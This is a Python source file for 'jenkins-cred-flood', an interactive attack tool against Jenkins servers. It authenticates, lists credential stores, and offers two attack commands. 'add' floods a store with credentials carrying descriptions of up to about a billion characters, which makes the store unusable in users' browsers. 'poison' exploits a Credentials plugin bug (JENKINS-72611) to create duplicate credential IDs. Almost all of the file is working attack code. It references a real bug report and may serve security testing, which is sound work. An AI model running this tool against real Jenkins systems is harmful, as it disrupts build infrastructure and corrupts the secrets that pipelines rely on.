import argparse
import requests
import re
import urllib
import random
import sys
from requests.cookies import RequestsCookieJar
from lxml import html
from dataclasses import dataclass
from typing import List

@dataclass
class Credential:
    type: str
    store: str
    domain: str
    id: str
    name: str

@dataclass
class Store:
    name: str
    items: List[Credential]

class CustomHelpFormatter(argparse.HelpFormatter):
    def __init__(self, prog, indent_increment=2, max_help_position=50, width=None):
        super().__init__(prog, indent_increment, max_help_position, width)

    def _format_action_invocation(self, action):
        if action.option_strings:
            options = ', '.join(action.option_strings)
            if action.nargs != 0:
                metavar = self._format_args(action, action.dest.upper())
                return f'{options} {metavar}'
            return options
        return super()._format_action_invocation(action)

    def _split_lines(self, text, width):
        return text.splitlines()

parser = argparse.ArgumentParser(description="Process some arguments for HTTP request.", formatter_class=CustomHelpFormatter)
parser.add_argument(
    '-l',  '--url', 
    metavar='https://localhost:8080', 
    required=True, 
    type=str, 
    help='Jenkins URL.'
)
parser.add_argument(
    '-u', '--username',
    type=str,
    metavar='admin',
    help='Username for authentication (requires --password), e.g., admin.'
)
parser.add_argument(
    '-p', '--password',
    type=str,
    metavar='s#cr3tw0rd.',
    help='Password for authentication (requires --username), e.g., secret.'
)
parser.add_argument(
    '-t', '--token',
    type=str,
    metavar='JSESSIONID.3ca79i9ds3457ergg',
    help='Session token for authentication, e.g., JSESSIONID.3ca79i9ds3457ergg.'
)

user_arguments = parser.parse_args()
url = user_arguments.url
username = user_arguments.username
password = user_arguments.password
token = user_arguments.token
session = requests.Session()
stores = []

def authenticate():
    session.get(url)
    data = {
        "j_username": username,
        "j_password": password,
        "from": "/",
        "Submit": ""
    }
    request = requests.Request('POST', f'{url}/j_spring_security_check', data=data)
    prepared_request = session.prepare_request(request)
    response = session.send(prepared_request)
    if response.status_code == 200:
        print("Authentication successful!\n")
    else:
        sys.exit(f'Authentication failed with status code: {response.status_code}')


def check_cookie():
    jsessionid = ''
    name, sep, value = token.partition('=')
    if name.strip().startswith('JSESSIONID'):
        jsessionid = value.strip()
    else:
        Exception("Malformed token")
    cookie_jar = RequestsCookieJar()
    cookie_jar.set(name, jsessionid)
    session.cookies.update(cookie_jar)
    response = session.get(url)
    tree = html.fromstring(response.content)
    logout_link = tree.xpath('//a[@href="/logout"]')
    if logout_link:
        print('Authentication successful!')
    else:
        sys.exit(f'Authentication failed with status code: {response.status_code}')

#This method was Supported via standard programming aids
def extract_version(version_string):
    # Use regex to extract the major version and the hexadecimal parts
    match = re.match(r'(\d+)\.v([0-9a-f]+(?:_[0-9a-f]+)*)', version_string, re.IGNORECASE)
    if match:
        major = int(match.group(1))
        minor_parts = [int(part, 16) for part in match.group(2).split('_')]
        return major, minor_parts
    return None, None

#This method was mostly Supported via standard programming aids
def is_at_least_version(current_version):
    required_major, required_minor_parts = extract_version("1337.v60b_d7b_c7b_c9f")
    current_major, current_minor_parts = extract_version(current_version)

    if required_major is None or required_minor_parts is None:
        print("Invalid required version string format")
        return False
    
    if current_major is None or current_minor_parts is None:
        print("Invalid current version string format")
        return False
    
    # Compare the major version
    if current_major > required_major:
        return True
    elif current_major < required_major:
        return False

    # Compare each minor part
    min_length = min(len(current_minor_parts), len(required_minor_parts))
    for i in range(min_length):
        if current_minor_parts[i] > required_minor_parts[i]:
            return True
        elif current_minor_parts[i] < required_minor_parts[i]:
            return False
    
    # If lengths differ, compare the remaining parts
    if len(current_minor_parts) > len(required_minor_parts):
        # Current version has more minor parts, which means it is higher
        return True
    elif len(current_minor_parts) < len(required_minor_parts):
        # Required version has more minor parts, which means it is higher
        return False

    # If all compared parts are equal
    return True

def get_credentials_version():
    response = session.get(f'{url}/manage/pluginManager/installed?filter=credentials')
    tree = html.fromstring(response.content)
    plugin_version = tree.xpath('//tr[@data-plugin-id="credentials"]/td[1]/div[@class="plugin-name success-plugin"]/a/span/text()')

    if not plugin_version:
        print("It was not possible to detect plugin version")
        return None
    return plugin_version[0].strip()

def parse_credential_tree(tree, folder=None):
    credential_list = []
    tmp_credential_list = tree.xpath('//div[@id="main-panel"]//div//div//h1[contains(text(), "Credentials")]/ancestor::div[@id="main-panel"]//table/tbody//tr')
    breadcrumb_bar = tree.xpath('//div[@id="breadcrumbBar"]//text()')
    if len(breadcrumb_bar) == 0:
        print("Oops... breadcrumb_bar not identified")
        print("If you have added large credentials to that store, that may be the reason why it is not loading")
        return
    del breadcrumb_bar[0]
    if breadcrumb_bar:
        del breadcrumb_bar[len(breadcrumb_bar)-1]

    if tmp_credential_list:
        for tr in tmp_credential_list:
            cred_type = tr.xpath('./td[1]/span/text()')
            cred_store = tr.xpath('./td[3]/a/text()')
            cred_domain = tr.xpath('./td[4]/a/text()')
            cred_id = tr.xpath('./td[5]/span/text()')
            cred_name = tr.xpath('./td[6]/a/text()')

            if folder and (" Â» ".join(breadcrumb_bar) != cred_store[0]):
                continue
            else:
                cred_store[0]="/".join(breadcrumb_bar) 
            if cred_id:
                store_name= cred_store[0]
                if store_name == "Manage Jenkins":
                    store_name = "System"
                credential_list.append(Credential(type=cred_type[0], store=store_name, domain=cred_domain[0], id=cred_id[0], name=cred_name[0]))
        if folder:
            stores.append(Store(name=folder[0], items=credential_list))
        else:
            stores.append(Store(name="System", items=credential_list))
    return

def get_credentials_from_folders(tree, parent=None):
    folders = tree.xpath('//table[@id="projectstatus"]//tr//td[3]//a')
    if folders:
        for f in folders:
            newParent = parent
            link =  f.xpath('./@href')[0]
            if parent != None:
                link = f'{parent}{link}'
            else:
                newParent= link
            name = f.xpath('span/text()')
            folder_link = f'{url}/{link}'
            if folder_link.endswith('/'):
                folder_link = f'{folder_link}credentials/'
            else:
                folder_link = f'{folder_link}/credentials/'
            response = session.get(f'{folder_link}')
            tree = html.fromstring(response.content)
            parse_credential_tree(tree, name)
            response = session.get(f'{url}/{link}')
            tree = html.fromstring(response.content)
            get_credentials_from_folders(tree, newParent) 

def fetch_all_credentials():
    response = session.get(f'{url}/manage/credentials')
    tree = html.fromstring(response.content)
    parse_credential_tree(tree)

    #Check other folders and organizations
    response = session.get(url)
    tree = html.fromstring(response.content)
    get_credentials_from_folders(tree)

def format_name(name):
    return (name[:32] + '...') if len(name) > 35 else name

def print_table(stores):
    width = 35

    header = f'{"ID":<{width}} {"NAME":<{width}} {"STORE":<{width}} {"TYPE":<{width}} {"DOMAIN":<{width}}'
    print(header)
    print('-' * len(header))
    
    for store in stores:
        for item in store.items:
            print(f'{item.id:<{width}} {format_name(item.name):<{width}} {format_name(item.store):<{width}} {format_name(item.type):<{width}} {format_name(item.domain):<{width}}')

def print_commands():
    print("Available commands:")
    print("  help                   - Show this help message")
    print("  list                   - List all credentials from all stores")
    print("  list STORE_PATH        - List credentials from a specific store. E.g.: list store/sub-store")
    print("  add                    - Add a credential, or set of credentials, to a specific store with any length. Will slow down users' browser")
    print("  poison                 - Add credentials with same ID as already existing ones. This is only possible if Credentials plugin version is prior to 1337.v60b_d7b_c7b_c9f")
    print("  exit                   - Exit the program")
    return

def list_stores():
    fetch_all_credentials()
    print_table(stores)

def store_name_to_link(store):
    if store == "System" or store == "system" or store == None:
        return f'{url}/manage/credentials/', 'system'
    store_path = store.split('/')
    store_path_index = 0
    response = session.get(url)
    tree = html.fromstring(response.content)
    full_link = ""
    #open the folder recursevely until find the right path. Then stop and parse credentials
    while True:
        path_identified = False
        folders = tree.xpath('//table[@id="projectstatus"]//tr//td[3]//a')
        if folders:
            for f in folders:
                name = f.xpath('span/text()')[0]
                if name == store_path[store_path_index]:
                    path_identified = True
                    link =  f.xpath('./@href')[0]
                    if full_link:
                        full_link = f'{full_link}/{link}'
                    else:
                        full_link = link
                    response = session.get(f'{url}/{full_link}')
                    tree = html.fromstring(response.content)
                    if store_path_index+1 == len(store_path):
                        return_link = f'{url}/{full_link}credentials'
                        return return_link, store_path[store_path_index]
                    else:
                        store_path_index = store_path_index + 1
                        break
        if not path_identified:
            print("Store not found")
            return None, None

def list_store(store):
    store_link, store_name = store_name_to_link(store)
    print(f'Store link: {store_link}')
    if  store_link:
        response = session.get(store_link)
        tree = html.fromstring(response.content)
        parse_credential_tree(tree, [store_name])
        print_table(stores)

def generate_random_hex(length):
    random_number = random.getrandbits(length * 4)
    hex_number = hex(random_number)[2:]
    return hex_number.zfill(length)

def credential_data(id, description, jenkins_crumb):
    return {
        "json":f'''{{
            "": "0",
            "credentials": {{
                "username": "username",
                "usernameSecret": false,
                "password":"password",
                "$redact":"password",
                "id":"{id}",
                "description":"{description}",
                "stapler-class":"com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl",
                "$class":"com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl"
            }}
        }}''',
        "Jenkins-Crumb":f"{jenkins_crumb}"
    }

def add_credential_request(id, description, jenkins_crumb, request_link, ignore_success_message = False):
    print(f'Adding credential #{id}')
    data = credential_data(id, description, jenkins_crumb)
    request = requests.Request('POST', request_link, data=data)
    prepared_request = session.prepare_request(request)
    response = session.send(prepared_request)
    if response.status_code == 200:
        if ignore_success_message is False:
            print("Credential successfully added!\n")
    else:
        print(f'Credential creation failed with status code: {response.status_code}\n')    

def read_store_and_domain():
    store = input('# (default - "System") store: ')
    is_folder = False
    if not store or store=="System":
        store = "system"
    else:
        is_folder = True
    domain = input('# (default - "(global)") domain: ')
    encoded_domain = "_"
    if not domain:
        domain = "(global)"
    else:
        encoded_domain = urllib.parse.quote(domain)
    
    store_link, store_name = store_name_to_link(store)
    if not store_link:
        print("Error: Store not identified")
        return
    if not store_link.endswith('/'):
        store_link = f'{store_link}/'
    crumb_link = f'{store_link}store'
    if store == "system":
        crumb_link = f'{store_link}store/{store}'
    if is_folder:
        crumb_link = f'{crumb_link}/folder'
    crumb_link = f'{crumb_link}/domain/{encoded_domain}/newCredentials'
    print(f'Crumb link: {crumb_link}')
    response = session.get(crumb_link)
    tree = html.fromstring(response.content)

    jenkins_crumb_xpath = tree.xpath("//head/@data-crumb-value")
    if not jenkins_crumb_xpath:
        print('ERROR: Jenkins crumb not found')
        return None, None, None
    jenkins_crumb = jenkins_crumb_xpath[0]

    request_link = f'{store_link}store'
    if is_folder:
        request_link = f'{request_link}/folder'
    elif store == "system":
        request_link = f'{request_link}/system'
    
    domain_link = f'{request_link}/domain/{encoded_domain}'
    request_link = f'{request_link}/domain/{encoded_domain}/createCredentials'
    return store, jenkins_crumb, request_link, domain_link

def add_credential():
    store, jenkins_crumb, request_link, domain_link  = read_store_and_domain()
    if store is None:
        return
    description_length = input("# (default - 99999999) description length: ")
    length = 99999999
    if description_length:
        length = int(description_length)
    if length >= 1000000000:
        print(f"⚠️  {length} characters long description will make '{store}' store unusable for the most clients ⚠️")
        while True:
            procceed = input("# (y/n) procceed: ")
            if procceed == "n" or procceed == "N":
                return
            elif procceed == "Y" or procceed == "y":
                break
            else:
                print("invalid option")
            
    print(f"Length: {length}")
    clone_times = 1
    clone = input('# (default - 1) number of credentials: ')
    if clone:
        clone_times = int(clone)
    print("This may take a while...")
    random_number = generate_random_hex(5)
    credential_secret_value = 'A'*length
    for i in range(clone_times):
        add_credential_request(f'creds-flood-{random_number}-{i}', credential_secret_value, jenkins_crumb, request_link)
    return

def poison():
    store, jenkins_crumb, request_link, domain_link  = read_store_and_domain()
    if store is None:
        return
    credential_id = input('# target credential id: ')
    if not credential_id:
        print("Credential cannot be empty")
        return
    credential_url = f'{domain_link}/credential/{urllib.parse.quote(credential_id)}'
    response = session.get(credential_url)
    if response.status_code != 200:
        print(f'Credential with ID "{credential_id}" was not found. Response status code: {response.status_code}')
        return
    description = input('# description: ')
    add_credential_request(f'{credential_id}-flood_copy', description, jenkins_crumb, request_link, True)

    data = {
        "json":f'''{{
            "username": "username",
            "usernameSecret": false,
            "password":"password",
            "$redact":"password",
            "id":"{credential_id}",
            "description":"{description}",
            "stapler-class":"com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl",
            "$class":"com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl"
    
        }}''',
        "Jenkins-Crumb":f"{jenkins_crumb}"
    }
    print(f'Update URL: {credential_url}-flood_copy/updateSubmit')
    request = requests.Request('POST', f'{credential_url}-flood_copy/updateSubmit', data=data)
    prepared_request = session.prepare_request(request)
    response = session.send(prepared_request)
    if response.status_code == 404 or response.status_code == 200:
        print(f"Credential successfully updated! Now your store has more than one credential with '{credential_id}' ID\n")
    else:
        print(f'Credential creation failed with status code: {response.status_code}\n')   

def execute(command):
    command_parts = command.split()
    sub_command = " ".join(command_parts[1:]) if len(command_parts) > 1 else None
    if command_parts:
        command = command_parts[0]
    global stores; 
    if command == "help":
        print_commands()
    elif command == "list":
        if sub_command is None:
            list_stores()
            print('')
        else:
            list_store(sub_command)
            print('')
    elif command == "add":
        add_credential()
    elif command == "poison":
        poison()
    elif command == 'exit':
        print("Exiting the program.")
        return False
    else:
        print("Command not found")
    stores =[]
    return True

def header():
    print('''
*********************************************************************************************************************************************
*                                                                                                                                           *
*                                            ██╗███████╗███╗   ██╗██╗  ██╗██╗███╗   ██╗███████╗                                             *             
*                                            ██║██╔════╝████╗  ██║██║ ██╔╝██║████╗  ██║██╔════╝                                             *
*                                            ██║█████╗  ██╔██╗ ██║█████╔╝ ██║██╔██╗ ██║███████╗                                             *
*                                       ██   ██║██╔══╝  ██║╚██╗██║██╔═██╗ ██║██║╚██╗██║╚════██║                                             *
*                                       ╚█████╔╝███████╗██║ ╚████║██║  ██╗██║██║ ╚████║███████║                                             *
*                                        ╚════╝ ╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝                                             *
*                                                                                                                                           *
*    ██████╗██████╗ ███████╗██████╗ ███████╗███╗   ██╗████████╗██╗ █████╗ ██╗     ███████╗    ███████╗██╗      ██████╗  ██████╗ ██████╗     *
*   ██╔════╝██╔══██╗██╔════╝██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██║██╔══██╗██║     ██╔════╝    ██╔════╝██║     ██╔═══██╗██╔═══██╗██╔══██╗    *
*   ██║     ██████╔╝█████╗  ██║  ██║█████╗  ██╔██╗ ██║   ██║   ██║███████║██║     ███████╗    █████╗  ██║     ██║   ██║██║   ██║██║  ██║    *
*   ██║     ██╔══██╗██╔══╝  ██║  ██║██╔══╝  ██║╚██╗██║   ██║   ██║██╔══██║██║     ╚════██║    ██╔══╝  ██║     ██║   ██║██║   ██║██║  ██║    *
*   ╚██████╗██║  ██║███████╗██████╔╝███████╗██║ ╚████║   ██║   ██║██║  ██║███████╗███████║    ██║     ███████╗╚██████╔╝╚██████╔╝██████╔╝    *
*   ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝      *
*                                                                                                                                           *
*                                                           WWW.HARCKADE.COM                                                                *
*                                                                                                                                           *
*   Github: https://github.com/Harckade/jenkins-cred-flood                                            License: MIT        version: 1.0      *
*   Author: Vlad Yultyyev                                                                                                                   *
*                                                                                                                                           *
*********************************************************************************************************************************************                                                                                                
          ''') 

def main():
    header()
    if not url:
        parser.error("Url is mandatory, please provide a valid Jenkins url. E.g.: --url https://localhost:8080")
    if ((username and password and token) or (username and not password) or (password and not username) or
        (username or password) and token):
        parser.error("You cannot provide both username/password and token. Choose one option.")
    if not (username and password) and not token:
        parser.error("You must provide either both username/password or a token.")
    print(f"Target url: {url}")
    if username:
        authenticate()
    else:
        check_cookie()
    version = get_credentials_version()
    if version:
        print(f'Credentials plugin version: {version}')
        is_affected = not is_at_least_version(version)

        if is_affected:
            print('🐛 Credential IDs can be updated -> It is possible to create multiple credentials with same ID')
        else:
            print('Credential IDs cannot be updated, but you still can add extremely large credential descriptions that will affect user\'s browsers.')
        print('\nDetails about the bug at: https://issues.jenkins.io/browse/JENKINS-72611\n\n')
    else:
        print('Credentials plugin not detected. This script may not work as expected.')
    print_commands()
    while True:
        user_input = input("# ")
        if not execute(user_input.strip()):
            break
main()